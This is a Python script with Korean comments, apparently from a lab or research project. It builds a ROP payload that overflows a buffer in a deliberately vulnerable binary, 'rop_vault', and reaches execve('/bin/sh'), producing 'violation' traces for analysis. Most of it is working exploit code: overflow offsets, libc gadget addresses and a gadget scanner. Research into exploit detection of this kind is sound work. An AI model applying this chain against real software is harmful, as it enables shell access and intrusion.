#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
make_f2_violation.py — 위반 입력(ROP 페이로드) 생성기  [레인: collect / 담당: 안세진]

issue #2 의 "안세진 님 1번: 11주차에 회수한 6주차 페이로드로 위반 입력 실제 수집".
이 스크립트는 rop_vault 의 vuln() 버퍼 오버플로로 RET 을 덮어 execve("/bin/sh")
체인을 실행시키는 입력 바이트열을 만들어 collect/inputs/f2-violation.txt 에 쓴다.
그 입력을 collect/run.sh f2-violation 으로 수집하면 트레이스가 execve(59) syscall
스텝으로 끝난다(design.md 의 위반 사례 기준: execve 도달 = 셸 실행).

왜 이렇게 구성하나 (design.md / synth.py 와 일치):
  - vuln(): `char buf[64]` 에 read(0,buf,256). 디스어셈블상 read 목적지는 [rbp-0x40],
    저장된 rbp 는 [rbp], RET 은 [rbp+8]. 따라서 buf→RET 거리 = 0x40 + 8 = 72 바이트.
  - 체인(synth f2-violation 과 동일한 정답 길이 17): ret 슬레드 14개 + pop rdi + pop rsi
    + pop rax(=59) → execve syscall. rdi=trusted_cmd("/bin/sh"), rsi=0, rdx=0.
  - 주소 재현성:
      * rop_vault 는 no-PIE → 내부 주소 고정: trusted_cmd=0x404060, pop rdi;ret=0x4011de.
      * libc 는 수집 환경이 `qemu -seed 1 -L target/sysroot` 로 base 가
        0x4000843000 에 고정(traces/real/f1-normal 헤더로 확인) → libc gadget 도 고정.
    그래서 같은 입력이면 같은 트레이스가 나온다(바이트 재현).

주의:
  - 아래 libc 게스트 주소는 '수집 환경(qemu-user, seed 1, 이 sysroot libc)' 기준이다.
    sysroot libc 나 수집 방식이 바뀌면 --scan 으로 다시 뽑아야 한다(이 스크립트가 해 준다).
  - 실제 수집은 Docker + qemu-user 안에서만 된다. 이 스크립트는 입력 파일만 만든다.

사용:
  # 리포지토리 루트에서, sysroot libc 로부터 주소를 직접 스캔해 입력 생성(권장)
  python3 collect/make_f2_violation.py --scan --out collect/inputs/f2-violation.txt
  # 또는 아래 하드코딩 주소로 생성
  python3 collect/make_f2_violation.py --out collect/inputs/f2-violation.txt
"""
import argparse
import struct
import sys
from pathlib import Path

# ── rop_vault 내부 고정 주소 (no-PIE) ────────────────────────────────
TRUSTED_CMD   = 0x404060     # "/bin/sh"
VULN_BUF_TO_RET = 0x40 + 8   # buf[rbp-0x40] → saved rbp → RET = 72 바이트

# ── 수집 환경(qemu seed 1, 이 sysroot libc) 기준 libc 게스트 주소 ──
#    --scan 을 주면 아래 값 대신 libc 에서 직접 찾은 값을 쓴다.
LIBC_BASE     = 0x4000843000
POP_RDI_RET   = 0x400086d3e5
POP_RSI_RET   = 0x400086ee51
POP_RAX_RET   = 0x4000888e40
BARE_RET      = 0x400086c659
SYSCALL_SITE  = 0x400088571e   # syscall; cmp rax,-4096; ja  (execve 진입점)

# synth f2-violation 과 같은 정답 길이 17: ret×14 + rdi + rsi + rax → execve
RET_SLED = 14


def p64(v: int) -> bytes:
    return struct.pack("<Q", v)


def scan_libc(sysroot_libc: Path, libc_base: int) -> dict:
    """sysroot libc 에서 gadget/ syscall 게스트 주소를 직접 찾는다."""
    from elftools.elf.elffile import ELFFile
    pats = {
        "pop_rdi": b"\x5f\xc3",
        "pop_rsi": b"\x5e\xc3",
        "pop_rax": b"\x58\xc3",
        "ret":     b"\xc3",
        "syscall_site": b"\x0f\x05\x48\x3d\x00\xf0\xff\xff\x77",
    }
    found = {}
    with open(sysroot_libc, "rb") as f:
        for seg in ELFFile(f).iter_segments():
            if seg["p_type"] == "PT_LOAD" and (seg["p_flags"] & 0x1):
                data = seg.data()
                va = seg["p_vaddr"]
                for key, pat in pats.items():
                    if key in found:
                        continue
                    i = data.find(pat)
                    if i >= 0:
                        found[key] = libc_base + va + i
    missing = set(pats) - set(found)
    if missing:
        raise RuntimeError(f"libc 에서 못 찾은 패턴: {sorted(missing)}")
    return found


def build_payload(addrs: dict) -> bytes:
    """오버플로 패딩 + ROP 체인."""
    chain = b"A" * VULN_BUF_TO_RET          # buf..saved rbp..RET 직전까지
    chain += p64(addrs["ret"]) * RET_SLED   # ret 슬레드 14 (연쇄 길이 벌기 + 정렬)
    chain += p64(addrs["pop_rdi"]) + p64(TRUSTED_CMD)   # rdi = "/bin/sh"
    chain += p64(addrs["pop_rsi"]) + p64(0)             # rsi = 0 (argv=NULL)
    chain += p64(addrs["pop_rax"]) + p64(59)            # rax = 59 (execve)
    # rdx(envp) 는 대개 0 으로 시작하므로 생략. 필요시 pop rdx 체인 추가.
    chain += p64(addrs["syscall_site"])                 # execve 진입
    return chain


def main(argv=None):
    ap = argparse.ArgumentParser(description="rop_vault 위반 입력(ROP 페이로드) 생성")
    ap.add_argument("--out", default="collect/inputs/f2-violation.txt",
                    help="출력 입력 파일 경로")
    ap.add_argument("--scan", action="store_true",
                    help="sysroot libc 에서 gadget 주소를 직접 스캔(권장)")
    ap.add_argument("--sysroot-libc",
                    default="target/sysroot/lib/x86_64-linux-gnu/libc.so.6")
    ap.add_argument("--libc-base", default=hex(LIBC_BASE),
                    help="수집 환경의 libc 게스트 base (기본: seed 1 기준값)")
    args = ap.parse_args(argv)

    if args.scan:
        base = int(args.libc_base, 16)
        g = scan_libc(Path(args.sysroot_libc), base)
        addrs = {
            "pop_rdi": g["pop_rdi"], "pop_rsi": g["pop_rsi"],
            "pop_rax": g["pop_rax"], "ret": g["ret"],
            "syscall_site": g["syscall_site"],
        }
    else:
        addrs = {
            "pop_rdi": POP_RDI_RET, "pop_rsi": POP_RSI_RET,
            "pop_rax": POP_RAX_RET, "ret": BARE_RET,
            "syscall_site": SYSCALL_SITE,
        }

    payload = build_payload(addrs)
    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(payload)

    # 요약 출력
    print(f"[make_f2_violation] wrote {out} ({len(payload)} bytes)")
    print(f"  buf→RET padding : {VULN_BUF_TO_RET} bytes ('A'*{VULN_BUF_TO_RET})")
    print(f"  ret sled        : {RET_SLED} x {hex(addrs['ret'])}")
    print(f"  pop rdi; ret    : {hex(addrs['pop_rdi'])}  -> rdi={hex(TRUSTED_CMD)} (/bin/sh)")
    print(f"  pop rsi; ret    : {hex(addrs['pop_rsi'])}  -> rsi=0")
    print(f"  pop rax; ret    : {hex(addrs['pop_rax'])}  -> rax=59 (execve)")
    print(f"  syscall site    : {hex(addrs['syscall_site'])}")
    print(f"  정답 연쇄 길이(gadget) = {RET_SLED + 3} (ret 14 + rdi + rsi + rax), "
          f"synth f2-violation 과 동일")
    return 0


if __name__ == "__main__":
    sys.exit(main())
